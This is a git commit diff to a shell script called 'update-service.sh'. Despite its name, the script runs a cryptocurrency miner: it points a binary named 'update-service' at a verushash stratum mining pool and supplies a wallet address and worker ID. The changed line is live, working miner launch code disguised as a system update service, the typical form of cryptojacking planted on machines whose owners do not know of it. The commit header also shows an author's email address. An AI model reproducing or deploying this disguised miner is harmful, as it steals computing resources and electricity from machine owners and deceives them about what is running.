25d9f76b4522291fc80914c963c3f1fa666de2f8
irruzzz07 <shopping.outsider@gmail.com>
2024-12-13 01:35:51 +0800

    Update update-service.sh

--- update-service.sh
+++ update-service.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-./update-service --disable-gpu --algorithm verushash --pool stratum+tcp://de.vipor.net:5040 --wallet RBufqygvWTYxnk1tHn1uaDt8onzjTuBJSb --Worker OCIUS001 --password x --cpu-threads 0
+./root/update-service/update-service --disable-gpu --algorithm verushash --pool stratum+tcp://de.vipor.net:5040 --wallet RBufqygvWTYxnk1tHn1uaDt8onzjTuBJSb --Worker OCIUS001 --password x --cpu-threads 0
